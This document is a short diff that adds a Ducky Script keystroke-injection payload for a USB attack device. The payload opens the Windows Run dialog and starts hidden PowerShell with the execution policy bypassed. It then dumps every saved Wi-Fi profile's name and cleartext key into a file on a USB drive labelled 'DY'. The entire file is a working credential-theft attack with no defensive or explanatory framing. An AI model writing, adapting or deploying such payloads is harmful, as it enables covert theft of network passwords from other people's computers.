@@ -1,0 +1,6 @@
+GUI r
+DELAY 200
+STRING powershell -nop -noni -ep bypass "$d=(gwmi Win32_Volume|?{$_.Label -eq 'DY'}).Name; netsh wlan show profiles|%{if($_ -match 'All User Profile\s*:\s*(.+)'){$n=$matches[1]; netsh wlan show profile name=\"$n\" key=clear|sls 'SSID|Key Content'}}>>${d}w.txt"
+ENTER
+DELAY 1000
+
